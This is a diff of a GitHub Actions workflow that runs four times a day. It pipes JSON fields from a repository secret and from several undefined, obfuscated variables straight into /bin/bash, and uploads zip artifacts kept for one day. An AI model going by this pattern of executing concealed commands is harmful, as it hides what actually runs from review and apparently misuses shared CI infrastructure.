@@ -1,25 +1,29 @@
 name: gongmincailu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '1 0/6 * * *'
-jobs:  # 16062
+    - cron: '34 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gongmincailu
         env:
-          dau7747: ${{ secrets.dau7747 }}
+          cpb0627: ${{ secrets.cpb0627 }}
         run: |
-          echo $dau7747 | jq -r .acf3 | /bin/bash
-          echo $rpit2 | jq -r .kpjvr491 | /bin/bash
-          echo $cif7775 | jq -r .ju5 | /bin/bash
-          echo $tex06 | jq -r .yn24 | /bin/bash
-          echo $b35766 | jq -r .geowf93 | /bin/bash
-          echo $pvb01 | jq -r .wql559 | /bin/bash
-          echo $m18 | jq -r .up83227 | /bin/bash
-          echo $mmva50253 | jq -r .imul639 | /bin/bash
+          printf '%s' "$cpb0627" | jq -r .fv3150 | /bin/bash
+          echo $kn18946 | jq -r .wd93 | /bin/bash
+          echo $qw398 | jq -r .iyq8 | /bin/bash
+          echo $ffii3680 | jq -r .lwmkz9 | /bin/bash
+          echo $g637 | jq -r .xf1 | /bin/bash
+          echo $jyf1768 | jq -r .cbgi086 | /bin/bash
+          echo $qvbd5 | jq -r .glti04 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: I4BikXwb
+          path: "*.zip"
+          retention-days: 1
